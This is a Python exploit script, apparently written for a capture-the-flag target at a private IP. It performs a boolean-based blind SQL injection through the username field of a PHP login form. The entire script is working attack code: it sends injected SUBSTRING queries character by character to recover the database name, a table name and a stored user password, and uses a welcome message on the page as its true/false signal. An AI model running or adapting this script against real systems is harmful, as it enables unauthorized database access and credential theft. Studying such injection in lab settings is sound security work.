#!/usr/bin/env python3

import requests
import string
from colorama import init as colorama_init
from colorama import Fore
colorama_init()

ip = "10.10.13.83" ## CHANGE THIS TO THE MACHINE IP 
uRL = f"http://{ip}/index.php" 
str_payload = string.ascii_letters + "_0123456789 "

def getDatabaseName(chr_position):
    chr_nya = "##"
    for c in str_payload:
        payload="kitty' and substring((SELECT BINARY database()),"+str(chr_position)+",1)='"+c+"' -- -"
        data={"username":payload,"password":"asdasd"}
        header = {'Content-Type': 'application/x-www-form-urlencoded'}
        r = requests.post(url=uRL, headers=header,data=data)
        if("Welcome to our site" in r.text):     
            chr_nya = c
            break
        
    return chr_nya

def getTableName(db_name, tb_length):
    chr_nya = "##"
    for c in str_payload:
        payload="kitty' and substring((select BINARY table_name from information_schema.tables where table_schema='"+db_name+"' limit 0,1),"+str(tb_length)+",1)='"+c+"' -- -"
        data={"username":payload,"password":"asdasd"}
        header = {'Content-Type': 'application/x-www-form-urlencoded'}
        r = requests.post(url=uRL, headers=header,data=data)
        if("Welcome to our site" in r.text):
            chr_nya = c
            break
    return chr_nya

def getKittyPassword(tb_name, tb_length):
    chr_nya = "##"
    for c in str_payload:
        payload="kitty' and substring((select BINARY password from "+tb_name+" limit 0,1), "+str(tb_length)+",1)='"+c+"' -- -"
        
        data={"username":payload,"password":"asdasd"}
        header = {'Content-Type': 'application/x-www-form-urlencoded'}
        r = requests.post(url=uRL, headers=header,data=data)
        if("Welcome to our site" in r.text):
            chr_nya =c
            break
    return chr_nya
        

print(f"[+] Brute database name")
db=[]
print(f"[+] {Fore.LIGHTRED_EX}", end="", flush=True)
for x in range(1,50):
    db_char = getDatabaseName(x)
    if(' ' in db_char or '#' in db_char):
        break
    print(f"{db_char}",end="", flush=True)
    db.append(str(db_char))
    
database=''.join(db)

tb=[]
print(f"{Fore.LIGHTGREEN_EX}\n[+] Brute table name on {database}")
print(f"[+] {Fore.LIGHTRED_EX}", end="", flush=True)
for x in range(1,50):
    tb_char = getTableName(database.strip(), x)
    if("##" in tb_char or ' ' in tb_char):
        break
    tb.append(tb_char)
    print(f"{tb_char}",end="", flush=True)

table=''.join(tb)
pwd=[]
print(f"{Fore.LIGHTGREEN_EX}\n[+] Brute password in {table}")
print(f"[+] {Fore.LIGHTRED_EX}", end="", flush=True)
for x in range(1,50):
    pwd_char = getKittyPassword(table.strip(), x)
    if("#" in pwd_char or ' ' in pwd_char):
        break
    pwd.append(pwd_char)
    print(f"{pwd_char}",end="", flush=True)
